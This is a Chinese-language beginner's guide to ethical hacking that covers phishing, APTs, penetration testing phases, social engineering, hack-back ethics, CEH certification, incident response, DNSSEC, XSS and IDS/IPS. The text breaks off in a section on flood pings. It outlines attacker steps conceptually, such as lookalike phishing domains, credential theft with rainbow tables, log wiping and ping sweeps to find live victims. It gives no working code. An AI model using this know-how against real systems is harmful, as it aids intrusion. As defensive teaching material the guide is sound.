- "# 黑客技术精要——道德黑客与渗透测试初学者指南\n\n\n\n## 简介\n\n确保您的 IT 基础设施、服务和应用程序安全的一种有效方法，是聘请自由职业的白帽黑客对其进行攻击。无论您喜不喜欢，黑客都会渗透您的系统，因此参与这一过程以弥补安全漏洞将对您有益。遗憾的是，许多公司没有足够的资源进行渗透测试。对于需要以较低价格获得此项服务的小公司来说，众包是一个绝佳的选择。您可以在合适的时间以实惠的价格获得所需的人才。当您不亲自了解这些参与者时，您面临的风险是：对方可能不像他们声称的那样经验丰富，或者无法胜任工作。最大的风险是他们会保留收集到的信息以备后用。幸运的是，有一些受信任的公司充当您与黑客之间的中介。他们为您联系技术娴熟、经过审核的黑客，并提供框架和计划，收取一定费用。一些最大且最常见的众包公司包括\
  \ `HackerOne`、`Bugcrowd` 和 `Synack`。这些公司及同类公司提供三项主要服务：\n\n- 漏洞赏金计划\n- 渗透测试\n- 漏洞披露\n\
  \n漏洞披露涉及客户创建并发布漏洞披露计划。它定义了黑客如何以及在何处联系中介或客户以报告新发现的漏洞。其中包含了黑客、中介和客户的期望与责任。有些黑客曾在供应商有机会修补漏洞之前，就不负责任地向公众披露其发现。然而，他们之所以这样做，是因为对公司不合理的回应感到沮丧。渗透测试是为众包企业带来最大收入的服务。他们以特定价格将客户与一群技术高超的黑客联系起来，针对特定工作范围开展工作。大多数与这些公司合作的黑客是兼职的——全职从事此工作的人不多。众包黑客在单个工作中能赚多少钱，取决于他们被选中的工作类型、经验和技能组合。一些黑客自愿从事这项工作以保障其国家的政府资源安全，而另一些则将收入捐给慈善机构。漏洞赏金公司可以为您节省大量资金和时间。并非所有黑客报告的漏洞都易于复现或构成安全威胁。漏洞赏金计划供应商会告诉您需要修复哪些已报告的漏洞。他们的工作是弄清哪些漏洞是真实的。无论您的\
  \ IT 安全团队有多优秀，公司都应该要求开展漏洞赏金计划。根据项目持续时间、工作经验量和黑客水平，这可能需要花费您从几千美元到几万美元不等。确定您的预算和想要完成的服务类型。如果您确定有必要进行众包，请与一家将为您管理流程并消除大部分风险的公司交谈。\n\
  \n\n\n\n\n### 第 1 章：网络钓鱼攻击\n\n网络钓鱼是一种社会工程学攻击。在大多数情况下，它被用于访问并窃取用户数据，例如信用卡号和登录凭证。当入侵者伪装成受信任的一方，并欺骗受害者打开短信、即时消息或电子邮件时，就会发生此类攻击。随后，受害者被诱导点击链接，从而允许攻击者冻结系统或安装恶意软件。这种攻击具有破坏性，可能导致身份盗窃、资金被盗和未经授权的购买。在政府或企业网络中，网络钓鱼授予入侵者立足点，并为更大规模的攻击（如\
  \ APT，高级持续性威胁）打开大门。在 APT 攻击中，组织可能遭受重大经济损失以及许多其他损害。\n\n网络钓鱼攻击示例可以是电子邮件，例如 `myuniversity.edu`，可能会发送给教职员工。邮件告知收件人其用户密码将在短时间内过期。邮件将包含说明，引导用户前往\
  \ `myuniversity.edu/renewal` 以更新密码。当收件人点击链接时，可能会发生以下几种情况：\n\n*   他们可能被重定向到一个虚假页面\
  \ `myuniversity.edurenewal.com`，该页面与实际的更新页面非常相似。系统要求用户输入旧密码和新密码。攻击者监控该页面并获取原始密码，从而获得对大学网络的访问权限。\n\
  *   链接可能将用户重定向到真实的密码更新页面。在重定向过程中，入侵者在后台激活恶意脚本，劫持用户的会话 Cookie。结果是形成了一次反射型 XSS 攻击，使攻击者能够访问特权信息。\n\
  \n电子邮件钓鱼诈骗是一场数字游戏。欺诈性消息会发送给大量收件人，因此即使只有极少比例的收件人上当受骗，攻击者仍能收集大量信息。入侵者拥有提高成功率的技巧。他们确保钓鱼消息看起来非常像目标机构发出的实际邮件。他们制造紧迫感，迫使收件人采取行动。消息中包含的链接看起来像合法链接。\n\
  \n鱼叉式网络钓鱼并非针对随机人员；它针对特定企业或个人。它是网络钓鱼的高级版本，需要关于组织的特殊知识。当攻击者获取有效的登录凭证时，他们可能成功实施第一阶段的\
  \ APT 攻击。\n\n为了保护组织免受网络钓鱼攻击，企业和用户都需要采取预防措施：\n\n*   **用户需要保持警惕。** 任何伪造的消息都会有一些小错误暴露其真面目。\n\
  *   **企业应遵循以下几个步骤，以减少鱼叉式网络钓鱼和网络钓鱼攻击：**\n    *   建立双因素认证 (2FA)。此方法要求用户在访问敏感信息时进行额外的验证步骤。\n\
  \    *   除了 2FA，公司还应制定严格的密码管理策略。员工应定期更换密码，并为不同的应用程序使用不同的密码。\n    *   企业应组织教育宣传活动。\n\
  \n---\n\n### 第 2 章：高级持续性威胁 (APT)\n\nAPT 是一个宽泛的术语。它描述了入侵者发起的一次攻击活动，旨在在网络上建立恶意的长期存在，以窃取敏感数据。入侵者或入侵者团队会仔细搜寻并挑选目标，通常是政府网络或大型企业。这些入侵可能造成巨大损害，包括：\n\
  \n*   知识产权窃取\n*   敏感信息泄露\n*   网站完全被接管\n*   关键基础设施遭到破坏\n\nAPT 攻击与传统的 Web 应用程序攻击略有不同，因为：\n\
  \n*   它们是人工执行的\n*   它们复杂得多\n*   它们绝非一击即走式攻击\n*   它们的目标通常是渗透整个网络\n\n## APT 发展阶段\n\
  \n一次成功的高级持续性威胁分三个阶段发生：\n\n1.  **渗透：** 在大多数情况下，企业是通过以下方式之一被渗透的：授权人类用户、网络资源或 Web 资产遭到攻陷。这可以通过社会工程学攻击（如鱼叉式网络钓鱼）或恶意上传（如\
  \ SQL 注入）来实现。此外，入侵者可以同时对目标发起 DDoS 攻击。这会分散网络人员的注意力并削弱安全边界。一旦实现初始访问，入侵者就会安装后门 Shell。这种恶意软件赋予他们网络访问权限和远程控制权。\n\
  2.  **扩展：** 一旦建立了立足点，他们就会扩大存在范围。他们沿着组织的层级向上移动，通过访问高度敏感的数据来攻陷员工。在此过程中，他们收集企业的关键信息，如财务记录、员工数据和产品线信息。他们可以将这些信息出售给竞争对手，或破坏产品线并摧毁公司。\n\
  3.  **提取：** 在 APT 事件期间，窃贼将窃取的数据存储在他们正在攻击的网络内部某个安全的地方。收集到足够数据后，他们会在不被察觉的情况下悄悄提取数据。当信息被提取时，您的安全团队会被“白噪音”干扰分散注意力。\n\
  \n## 缓解策略\n\n*   阻止被盗数据提取和防止后门安装的最佳方法是监控出站和入站流量。养成检查网络边界流量的习惯，以便任何异常行为都不会被忽视。\n\
  *   在网络边界部署 Web 应用程序防火墙，以帮助过滤发往 Web 应用程序服务器的流量。网络防火墙和其他内部流量监控服务也有帮助。\n*   白名单控制网络可访问的域和用户可安装的应用程序。它减少了入侵者可利用的攻击面。此安全措施并非万无一失。为了使其更有效，始终要有严格的更新策略，确保用户运行应用程序的更新版本。\n\
  *   您的员工是最大且最脆弱的软肋。目标分为三类：\n    *   粗心的用户\n    *   恶意内部人员\n    *   被攻陷的用户\n*   仔细审查所有员工及其有权访问的信息。\n\
  *   一旦发现操作系统和软件网络漏洞，立即修补。\n*   加密远程连接，以防入侵者利用它们访问您的网络。\n*   过滤传入邮件。这可以防止网络钓鱼攻击和垃圾邮件。\n\
  *   立即记录安全事件，以改进白名单和任何其他策略。\n\n---\n\n### 第 3 章：渗透测试\n\n\n\n\n渗透测试有时被称为渗透测试。它是针对您的\
  \ PC 系统模拟的网络攻击，旨在查明是否存在可利用的漏洞。在 Web 应用程序安全领域，渗透测试通常用于增强 WAF（Web 应用程序防火墙）。渗透测试有时涉及尝试突破多个应用程序系统，如前端/后端服务器和应用程序协议接口（API），以检查其易感性；例如，面临代码注入攻击风险的未清理输入。渗透测试提供的见解有助于修补检测到的漏洞并增强\
  \ WAF 安全策略。渗透测试过程可分为五个阶段：\n\n## 规划与侦察\n\n确定测试的范围和目标，包括要使用的测试方法和应解决的系统。收集情报（例如域名、网络、邮件服务器），以帮助更好地了解目标及其潜在漏洞。\n\
  \n## 扫描\n\n第二步涉及了解目标应用程序在面对不同入侵尝试时的行为。这通过以下方式实现：\n\n- **静态分析**：检查应用程序的代码，以粗略推测其运行时的行为。工具可一次性扫描完整代码。\n\
  - **动态分析**：在运行状态下检查应用程序的代码。这种扫描方法更实用，因为它提供了应用程序性能的实时视图。\n\n## 获取访问权限\n\n使用 Web 应用程序攻击（如后门、SQL\
  \ 注入和跨站脚本攻击）来揭示目标的漏洞。测试人员尝试利用这些易感性，通常通过窃取数据、提升权限、拦截流量和其他操作来了解可能造成的破坏程度。\n\n## 维持访问权限\n\
  \n旨在查看该易感性是否可用于在目标系统中维持立足点——并可能给攻击者足够的时间访问深层数据。其理念是模拟高级持续性威胁；它们在系统中长期潜伏，以便访问组织的敏感数据。\n\
  \n## 分析与报告\n\n渗透测试的发现将被汇总成一份报告，详细记录：\n\n- 发现的漏洞\n- 攻击者访问的任何敏感数据\n- 测试人员在未被检测到的情况下留在系统中的时长。\n\
  \n安全人员分析这些信息，以帮助他们配置企业的 WAF 设置并应用其他安全解决方案，从而修补发现的易感性并防止未来的攻击。\n\n## 渗透测试类型\n\n-\
  \ **外部渗透测试**：针对互联网上可见的公司资产进行，如公司网站、Web 应用程序、电子邮件等。\n- **内部渗透测试**：模拟恶意内部人员的攻击。\n\
  - **盲测**：测试人员仅获知企业名称。安全人员随后将看到实际攻击如何发生。\n- **双盲测试**：安全人员未被告知攻击。\n- **目标测试**：安全人员和测试人员协同工作，互相通报行动。\n\
  \n### 什么是社会工程学？\n\n操纵他人以泄露机密信息被称为社会工程学。攻击者可能寻求任何类型的信息，但主要针对登录凭据和银行信息。\n\n## 社会工程学攻击的表现形式\n\
  \n### 来自朋友的邮件\n\n犯罪分子可以通过社会工程学或黑客手段获取某人的电子邮件密码，从而访问其联系人列表，并可能访问其社交网络联系人。攻击者随后向受害者的联系人发送邮件，或在其社交媒体页面发布消息。\n\
  \n这些消息通常：\n\n- **包含链接**：认为邮件来自朋友，您可能毫不犹豫地点击。这样做会让犯罪分子通过安装恶意软件控制您的计算机。\n- **包含下载**：可能是嵌入病毒的图片、文档或视频。\n\
  \n### 来自其他受信任方的邮件\n\n网络钓鱼攻击是一种社会工程学攻击。它模仿受信任方，并以合理的理由诱导您泄露敏感数据或登录凭据。这些消息使用令人信服的借口或故事来：\n\
  \n- 紧急求助：编造悲惨故事并索要钱财。\n- 实施网络钓鱼：您可能收到似乎来自您的银行或其他合法来源的邮件或消息。\n- 为慈善筹款索要捐款：利用您的善良和慷慨。\n\
  - 要求验证您的凭据：包含将您引导至外观逼真的虚假网站的链接。\n- 告知您中了彩票或类似奖项：索要个人财务信息以便“汇款”给您。\n- 冒充您的同事或老板：可能要求您提供某项目的最新进展，然后索要机密信息。\n\
  \n### 诱饵场景\n\n这些骗局利用人们想要的东西作为诱饵。它们包装成令人惊叹的交易（通常有良好的评价显示卖家可信）。上钩可能导致您失去对计算机的控制，甚至更糟——损失银行账户中的所有资金。\n\
  \n### 对从未提问的查询的回复\n\n攻击者可能假装拥有您提问的解决方案。他们通常冒充数百万人使用的公司。他们将此消息发送给尽可能多的人。不使用该公司服务的人会忽略该消息，但客户很可能会上钩。\n\
  \n### 制造麻烦\n\n这种类型的社会工程学攻击由意图制造破坏的犯罪分子实施。他们入侵受害者的账户（最可能是社交媒体账户）并制造事端。\n\n## 不要成为受害者\n\
  \n### 牢记提示\n\n- 即使消息看似紧急，也要放慢脚步。\n- 核实事实。\n- 不要点击链接。使用搜索引擎查找真实网站。\n- 邮件劫持很常见。\n\
  - 避免可疑下载。\n- 外国人的馈赠不是真的。\n\n## 如何保护自己\n\n- 删除索要密码和财务信息的请求。\n- 忽略求助请求。\n- 将垃圾邮件过滤器设置为高级别。\n\
  - 保护您的电子设备。\n\n---\n\n| ![image](img/chapter_title_corner_decoration_left.png) |\
  \ | | ![image](img/chapter_title_corner_decoration_right.png) |\n| --- | --- | ---\
  \ | --- |\n\n![image](img/chapter_title_above.png)\n\n### 第 4 章\n\n### 反黑客：救世主还是义警？\n\
  \n![image](img/chapter_title_below.png)\n\n\n\n当新的蠕虫或病毒发起攻击时，系统管理员和用户通常会措手不及。但是，一两年后，系统管理员和用户继续让相同的威胁未被检测到，这可以接受吗？您的\
  \ ISP 和互联网上大量的带宽是否应该继续被蠕虫流量和病毒消耗，而这些本可以轻松预防？最近许多蠕虫和病毒的攻击目标是早已有补丁可用的漏洞，甚至早在数月前就已发布补丁。如果管理员和用户能及时修补漏洞，病毒根本不会对其系统构成威胁。另一点是，当出现新威胁时，操作系统和杀毒软件供应商会推出更新和补丁以覆盖漏洞或检测并清除威胁，所有用户都应采取必要措施保护其系统和互联网社区的其他成员。但如果用户无知或选择不采取任何必要行动来遏制威胁，反而传播感染；社区应该做出回应吗？根据许多人的观点，这在伦理和道德上是错误的。这被视为私刑执法。持这一观点的人认为，报复并自行处理问题，在法律上讲，使你与最初的威胁一样糟糕。最近互联网上传播着\
  \ W32/Fizzer@MM 蠕虫。一些运营商决定编写代码以自动禁用该蠕虫。这段代码被移除，以便对该策略的合法性进行进一步调查。它应该被合法化吗？在上述情况下，任何未感染的机器都不会受到影响。运营商并没有创建反蠕虫程序，而更像是一种“疫苗”代码，且该代码位于一个已被蠕虫感染的站点上。只有拥有受感染设备的人才会想要连接到该站点。即使这些设备的所有者不知道蠕虫的存在，运营商通过清理他们的设备，仍然是在为他们提供服务，对吧？这种行为可以定义为自卫，但在这种情况下，存在用户甚至不知道自己被感染的情况。当一个无防护的用户被感染时，整个互联网都处于风险之中。虽然这样的用户对其设备拥有主权，但他们对互联网的其他部分没有主权。当用户连接到互联网时，应该有准则约束每一位用户。与现实生活不同，没有互联网警察部队。然而，应该有一个或多个组织拥有制定病毒疫苗或反蠕虫程序的权限。它们将寻找受感染的计算机并尝试清理它们。从道德上讲，入侵某人的计算机以尝试清理它，并不比最初攻击该设备的蠕虫或病毒更糟糕。这是一个滑坡谬误，反黑客行为处于降至恶意开发者水平与合理自卫之间的灰色地带。\n\
  \n---\n\n![image](img/chapter_title_corner_decoration_left.png) ||  || ![image](img/chapter_title_corner_decoration_right.png)\n\
  \n---\n\n![image](img/chapter_title_above.png)\n\n### Chapter 5\n\n### Ethical Hacking\n\
  \n![image](img/chapter_title_below.png)\n\n道德黑客，也称为白帽黑客，是一位 IT 安全专家，拥有与恶意黑客（黑帽黑客）相同的技能组合。他们使用与黑帽黑客相同的技术来揭示公司系统中的弱点和漏洞。恶意黑客在操作前未获得受害者的同意，其目的在于造成破坏、获取名声或牟利。相反，道德黑客受组织委托，入侵该组织的系统，以查明是否存在可被黑帽黑客利用的安全漏洞。人们首次尝试入侵计算机系统是在\
  \ 20 世纪 60 年代。20 世纪 70 年代，公司和政府组建了“虎队”。他们的工作是寻找计算和电信系统中的任何漏洞——他们是第一批白帽黑客。在 20 世纪\
  \ 80 年代和 90 年代，更多人拥有了个人计算机，这使得黑客行为成为一种全球现象。“道德黑客”这一术语由 John Patrick 于 1995 年提出。此后，道德黑客成为一种合法职业。\n\
  \n## Certified Ethical Hacker (CEH) Certification\n\n拥有道德黑客认证至关重要。在组织雇佣白帽黑客之前，他们需要确保该黑客技术娴熟，并将技能用于造福公司而非造成损害。认证道德黑客认证由新墨西哥州的一个非营利组织——电子商务委员会\
  \ (EC-Council) 定义。该认证使信息安全专业人员合法化，并允许他们被认可为道德黑客。该认证要求极高。它涵盖了众多安全工具、攻击向量和概念，每位学员都必须深入理解。许多组织对其予以认可，其中包括美国国防部和国家安全局\
  \ (NSA)。要获得认证黑客资格，学员必须通过 CEH 考试。为准备考试：\n\n- 学员可以参加 EC-Council 提供的 CEH 培训计划。三家认证培训中心包括\
  \ Affinity IT Security、Pearson Vue Testing Center 和 EC-Council。\n- EC-Council 在其网站上提供\
  \ CEH 考试大纲和 CEH 手册。\n- 多家机构提供备考课程。\n- EC-Council 鼓励考生参加模拟测试。\n\n要参加 CEH 考试，考生必须完成\
  \ EC-Council 提供的培训计划，并证明在 5 个领域中至少有 3 个领域的经验。或者，他们需要在信息安全领域拥有两年工作经验。Web 应用程序是黑客的主要目标。由于其复杂的多层架构，它们容易受到攻击。它们还存储敏感数据，且可从外部轻松访问。认证黑客对现代攻击技术、威胁向量和软件系统有广泛的了解。他们可以利用这些知识帮助公司了解其\
  \ Web 应用程序的安全状况、威胁等级，以及如何提高安全性。\n\n---\n\n![image](img/chapter_title_corner_decoration_left.png)\
  \ ||  || ![image](img/chapter_title_corner_decoration_right.png)\n\n---\n\n![image](img/chapter_title_above.png)\n\
  \n### Chapter 6\n\n### Steps Hackers Take to Execute a Successful Cyber Attack\n\
  \n![image](img/chapter_title_below.png)\n\n\n\n网络攻击与其他任何雄心勃勃的事业一样，必须经过精心策划和精确执行才能成功。根据行业研究，高级攻击在被发现前，平均会在组织系统中潜伏\
  \ 200 天。想想看，这是一段很长的时间。在此期间，攻击者一直在收集数据、绘制网络拓扑图并监控通信。如果你能从攻击者的角度理解他们为成功实施攻击所采取的步骤，那么你就可以防止此类事件发生在你的组织身上，或者缩短发现攻击所需的时间。\n\
  \n侦察意味着在行动前先摸清情况。黑客首先确定一个薄弱的目标，然后想出最佳的利用方式。他们了解组织架构，寻找任何薄弱环节的员工，并决定是攻击第三方还是公司网站。任何人都可能成为初始目标。攻击者只需要一个切入点。一旦黑客确定了目标，他们就会寻找能够获得访问权限的弱点。他们通过使用互联网上的扫描工具检查组织网络来实现这一点。这个过程可能需要一些时间。\n\
  \n一旦他们发现了网络中的漏洞，就会进行访问和权限提升，在不被发现的情况下访问网络并在其中横向移动。在这种情况下，他们需要特权访问以便自由移动。诸如彩虹表之类的工具可以帮助黑客窃取凭证并获得管理员权限。然后他们可以通过管理员账户访问任何系统。有了提升的权限，入侵者基本上就接管了网络，现在“拥有”了该网络。凭借在网络中自由移动的能力，黑客可以访问组织系统中最敏感的数据并将其窃取。他们可能不仅对窃取私有数据感兴趣——如果他们愿意，还可以删除或更改文件。他们的下一步是在网络中悄无声息地潜伏。他们可能会决定安装\
  \ Rootkit 和其他恶意程序，以便随时返回。既然他们已经拥有了提升的权限，就不再依赖单一的切入点。\n\n并非每次网络攻击都会进入攻击阶段。在这个阶段，情况可能会变得非常糟糕。入侵者可能会更改硬件功能，甚至完全禁用硬件。在这一步中，攻击者可能不再保持安静。有时，黑客会想掩盖踪迹，而其他时候，他们可能决定留下“签名”。踪迹混淆旨在使取证检查过程迷失方向、感到困惑并偏离正轨。踪迹混淆涉及的一些工具和技术包括特洛伊木马命令、僵尸账户、骨干网跳转、错误信息、欺骗和日志清理工具。根据\
  \ Mandiant 的数据，约 97% 的组织至少被攻破过一次。防御网络攻击最有效的方法是控制特权访问。\n\n| ![image](img/chapter_title_corner_decoration_left.png)\
  \ | | | ![image](img/chapter_title_corner_decoration_right.png) |\n| --- | --- |\
  \ --- | --- |\n\n![image](img/chapter_title_above.png)\n\n### 第 7 章\n\n### 事件响应\n\
  \n![image](img/chapter_title_below.png)\n\n在 Web 应用安全领域，事件是指对应用安全策略的尝试性违反或实际违反。篡改网站内容、数据窃取、未授权访问尝试、漏洞利用和网络入侵都是典型例子。事件响应是对此类威胁的缓解或预防。企业会采取有组织的方法来帮助他们改善网络防御并阻止安全漏洞。\n\
  \n这通过以下方式实现：\n\n*   找出应用的薄弱环节。\n*   加强针对威胁的安全参数。\n*   保护对应用所有敏感部分/数据的访问。\n\n即使尝试未成功，将其视为事件处理仍然是明智之举。\n\
  \nWeb 应用防火墙（WAF）是事件响应策略中非常重要的一部分。了解它们的用法有助于你制定高效的事件响应策略。该生命周期可分为三个阶段：准备阶段、检测/分析阶段和事件后活动阶段。在每个阶段，WAF\
  \ 技术扮演不同的角色。\n\n准备阶段是一个两部分的过程。它涉及建立安全配置并测试应用是否存在弱点。你可以采取以下几个步骤来准备应对威胁，同时保护应用的敏感区域：\n\
  \n*   **部署 WAF**：WAF 对传入流量进行分析，并阻止所有针对应用层的攻击尝试。一些 WAF 甚至可以保护应用免受零日攻击。\n*   **设置访问控制策略**：识别并保护包含敏感信息的应用和网站部分。这通过\
  \ `2FA`（双因素认证）完成。它提供额外的访问控制。\n*   **安全编排**：通过简化安全措施来开发一个连贯的工作流。例如，重新定义每个安全团队成员的任务和角色。\n\
  *   **弱点测试**：通常使用渗透测试来测试你的应用，以查看是否有任何可以被入侵者利用的软肋。然后进行调整以修补已识别的软肋。\n\n一旦部署，安全措施就会分析和过滤所有传入的\
  \ Web 流量。如果检测到任何事件，它们会阻止恶意请求、发出警报，并将有关威胁的所有详细信息记录在称为事件检测分析的综合安全日志中。\n\n日志包括：\n\n\
  *   犯罪者的地理位置和 IP 数据。\n*   攻击向量。\n*   入侵者的 HTTP 指纹。\n*   尝试进入的页面。\n\n当你拥有安全事件的详细描述时，你就可以理解它并制定适当的响应。事件后活动是整个过程的最后阶段，致力于利用前几个阶段学到的经验教训。它包含三个部分：\n\
  \n*   审查日志，以确定事件是否暴露了任何软肋。\n*   更改 WAF 规则并制定新策略以消除弱点。\n*   测试新规则。\n\n“冲洗并重复”是一个持续的过程。每个事件都是一个学习机会。它将帮助你提高企业的安全性并增强准备程度。\n\
  \n| ![image](img/chapter_title_corner_decoration_left.png) | | | ![image](img/chapter_title_corner_decoration_right.png)\
  \ |\n| --- | --- | --- | --- |\n\n![image](img/chapter_title_above.png)\n\n### 第\
  \ 8 章\n\n### DNSSEC\n\n![image](img/chapter_title_below.png)\n\n\n\n# DNSSEC（域名系统安全扩展）\n\
  \nDNSSEC 是一套增强 DNS（域名系统）安全性的扩展，通过确认结果未被篡改来保障安全。DNSSEC 可帮助企业加强其 DNS 安全性。DNS 欺骗是针对\
  \ DNS 基础设施攻击的一个典型案例。攻击者劫持 DNS 解析器的缓存。当用户访问该网站时，他们会收到错误的 IP 地址，从而查看攻击者的恶意站点，而非合法站点。组织可使用\
  \ DNSSEC 保护其 DNS 服务器中的定义和敏感数据。主机信息、邮件交换服务器详情和 IP 地址均属于 DNS 中的数据示例。DNSSEC 保护这些数据。它还可阻止通过\
  \ DNS 进行的数据渗漏。DNSSEC 旨在确保名称服务器发送给客户端的回复是真实的。这是通过数字签名技术实现的。加密签名被添加到 DNS 记录中，从而保护发布在\
  \ DNS 中的信息。DNSSEC 为 DNS 定义了新的资源记录类型，以增强数字签名验证。\n\n- **资源记录签名 (`RRSIG`)**：包含特定记录集的加密签名。\n\
  - **DNSKEY 记录**：包含用于 DNS 认证过程的公钥。\n- **DS（授权签名者）记录**：公共 `DNSKEY` 的指纹，保存在父区域中。\n\
  - **NSEC（下一条安全记录）**：利用 DNSSEC 排序顺序提取下一个有效的记录名称。因此，DNS 解析器可证明某 DNS 记录不存在。\n- **NSEC3**：通过在区域中对所有记录名称进行加密哈希，克服了\
  \ NSEC 遍历的潜在风险。\n\n## NSEC3 参数 (`NSEC3PARAM`)\n\n它为 DNS 服务器提供参数，以确定针对不存在名称的 DNSSEC\
  \ 请求响应中将包含的 `NSEC3` 记录。DNSSEC 可验证 DNS 请求，因此有助于降低 DNS 欺骗风险。但它并不解决利用 DNS 服务器的 DDoS（分布式拒绝服务）攻击。事实上，它可能会放大攻击效果。DNSSEC\
  \ 包含额外的加密信息和字段来验证记录，因此针对 DNS 问题发送的回复数据包更大。大响应使攻击者能获得更大的攻击流量。\n\n## DNSSEC 验证流程\n\
  \nDNSSEC 验证流程包含以下阶段：\n\n1. 用户输入 URL 地址。\n2. 浏览器查询本地计算机的 DNS 解析器以确定主机名的 IP 地址。\n\
  3. 若 IP 地址在解析器缓存中，则直接反馈给浏览器。\n4. 若未找到，请求被传递给递归解析器。\n5. 若递归解析器有该地址，则返回它。\n6. 若没有，则启动递归查询以确定持有所请求域名权威信息的\
  \ DNS 服务器。\n7. 首先联系根 DNS 服务器，它将解析器引荐给该域名的 TLD（顶级域）DNS 服务器。\n8. 解析器随后被 TLD DNS 引荐给权威名称服务器。\n\
  9. 在所有阶段中，解析器都会请求与 DNS 区域关联的 DNSSEC 密钥，以验证服务器的真实性。\n10. 解析器将验证 `RRSIG` 并确认其在传输过程中未被篡改。\n\
  \n---\n\n### 第 9 章：反射型跨站脚本（XSS）攻击\n\nWeb 应用程序的一种漏洞，允许入侵者将代码注入到外部网站的内容中，这被称为跨站脚本攻击（XSS）。当有人访问该网站上被感染的页面时，代码会在其浏览器中执行。因此，入侵者绕过了浏览器的“同源策略”，并可访问受害者的私密信息。\n\
  \n**反射型 XSS 攻击**，也称为非持久性攻击。当恶意脚本从 Web 应用反射到受害者的浏览器时发生。脚本通过链接激活。发送一个带有漏洞的请求到网站，从而使恶意脚本得以执行。此漏洞通常由未充分清理传入请求引起，这使\
  \ Web 应用程序的功能面临被操纵的风险。攻击者将恶意链接嵌入第三方网站或电子邮件以进行分发。链接提示用户点击，从而发起 XSS 请求。\n\n反射型攻击与存储型攻击的区别在于：后者要求攻击者寻找允许注入恶意脚本的网站；而反射型攻击中，脚本嵌入在链接上。要使该事件成功，用户必须点击该链接。\n\
  \n存储型和反射型 XSS 攻击的差异：\n\n- 反射型攻击更为常见\n- 警惕的用户可避免反射型攻击\n- 两者的影响范围不同\n\nXSS 攻击中的攻击者玩的是概率游戏。他将链接发送给成千上万的用户以增加成功几率。即使只有极小比例的用户决定点击链接，他仍将拥有大量受感染的论坛用户。这些用户将被定向到论坛网站，恶意脚本将在其浏览器中反射执行。因此，攻击者可通过窃取其会话\
  \ Cookie 劫持其账户。\n\n您可以通过多种方式预防和缓解 XSS 攻击。首先，对用户而言，保持警惕是防御 XSS 脚本的最佳手段。具体来说，用户应避免点击任何可疑链接，因为您永远不知道哪个链接包含恶意代码。您可在以下位置发现可疑链接：\n\
  \n- 社交媒体动态\n- 未知联系人发送的电子邮件\n- 网站的评论区\n\n网站运营商也应保护其用户免受潜在滥用。\n\nWeb 应用程序防火墙（`WAF`）在预防反射型\
  \ XSS 攻击方面大有裨益。它们可阻止输入清理缺失的异常请求。在存储型攻击中，阻止的是攻击者对网站的恶意请求；而在反射型攻击中，阻止的是用户的请求。这保护了用户和旁路受害者（其他网站用户）。一些\
  \ Web 应用程序防火墙使用签名过滤来对抗反射型 XSS 攻击。这些 `WAF` 利用众包技术自动收集整个网络的攻击数据。\n\n---\n\n### 第 10\
  \ 章：入侵检测和入侵防范\n\n入侵检测和入侵防范都是广泛的术语。它们描述了用于减少攻击和防范新威胁的应用安全实践。\n\n- **检测**是一种被动措施。它使用入侵检测系统（`IDS`）识别并中和正在进行的攻击。它清除现有恶意软件并检查社会工程学攻击。\n\
  - **防范**是主动的。它使用入侵防范系统（`IPS`）预先阻止应用攻击。\n\n`IDS` 是一种软件应用或硬件设备，它使用已知的入侵特征检测并分析出站和入站网络流量，以检查异常活动。\n\
  \n这通过以下方式实现：\n\n- 将系统文件与恶意软件特征进行比对\n- 通过扫描进程检测有害模式的迹象\n- 通过监控用户行为检测恶意意图\n- 监控系统配置和设置\n\
  \n\n\n### 第 11 章：Ping 扫描\n\n当检测到安全策略违规、配置错误或病毒时，IDS 可以将违规者踢出网络，并通知安全人员该事件。IDS 具有巨大的优势，包括攻击检测和网络流量分析。然而，它也有缺点。由于它仅使用已知的入侵特征库，因此可能无法检测新发现的威胁。此外，IDS\
  \ 无法检测即将到来的攻击，只能检测正在进行的攻击。因此，入侵防御系统是必要的。\n\nIPS（入侵防御系统）会检查系统的传入流量并移除任何恶意请求。常规的 IPS\
  \ 配置利用流量过滤解决方案和 Web 应用防火墙来保护应用程序。它丢弃恶意数据包、阻断恶意 IP，并将任何潜在威胁告知安全人员。由于这些系统使用现有的数据库进行特征识别，因此可以对其进行编程，以基于行为和流量异常来识别攻击。IPS\
  \ 系统在阻断攻击载荷方面非常高效，但它们仍有局限性。它们过度依赖预定义规则，因此容易产生误报。\n\nImperva 云 WAF 解决方案是完全可定制的工具。它们阻断任何安全威胁并减少误报。以下是\
  \ Imperva 云 WAF IPS 的一些功能：\n\n*   **WAF（Web 应用防火墙）：** 这种基于云的防火墙部署在您网络的边缘。它将使用特征、行为和信誉启发式方法来过滤应用攻击和恶意传入请求，从而保护您现有的\
  \ IPS。它具有高级功能，如应用感知技术、动态分析和访问控制，以缓解误报。\n*   **自定义规则：** Imperva 云 WAF 的功能得以扩展，允许您应用自己的访问控制和安全策略。定制功能有助于缓解误报，并清除您组织特有的任何隐藏威胁。\n\
  *   **双因素认证 (2FA)：** 2FA 要求用户在登录系统时通过两种方式/步骤进行验证，例如一次性密码 (OTP) 和密码。这额外的保护层保护敏感数据。\n\
  *   **后门防护：** 由于 IDS 配置依赖已知的恶意软件特征来识别后门，因此这只是一种权宜之计。攻击者可以轻松避开识别。Imperva 的后门防护彻底解决了这个问题。\n\
  \n## Ping 扫描\n\nPing 是系统基于网络的实用程序，用于判断主机是存活还是宕机。从技术上讲，它被称为回显应答。此处“存活”是指主机（网站、网络、系统、计算机等）处于活动状态。“宕机”意味着它处于关机模式。\n\
  \n> **注意：** 主机可以是任何设备，如网络、打印机、计算机系统、网站或任何其他设备。\n\n那么，什么是 Ping 扫描？它是一种通过 Ping 主机来识别存活主机的信息收集技术。更详细的技术细节：Ping\
  \ 扫描也可称为双向握手协议、ICMP 扫描（互联网控制消息协议）或 Ping 扫描。一台主机发送数据包（数据），另一台主机验证并返回反馈（数据包，同样）确认\
  \ Ping 是否成功——这就是为什么它被称为双向握手协议。\n\nPing 扫描可用于多种目的：在识别出主机的 IP 地址后，您可以 Ping 该地址以了解主机是存活还是宕机。如果数据包被正确接收，则表明主机存活，您可以继续对受害者（主机）发起攻击。\n\
  \n有许多可用于常规 Ping 扫描的工具，例如 `Nmap`、`gping` 和 `fping`。您也可以直接在 Linux 和 Windows 平台上使用循环\
  \ Shell 脚本来执行。\n\n在 Windows 上操作：\n1.  转到 **开始** > **运行** > `CMD`。\n2.  输入 `PING\
  \ 127.0.0.1`（主机的 IP 地址）。\n\n### 洪水 Ping\n\n洪水 Ping 是一种拒绝服务攻击。它通过向主机或网站发送大量 Ping\
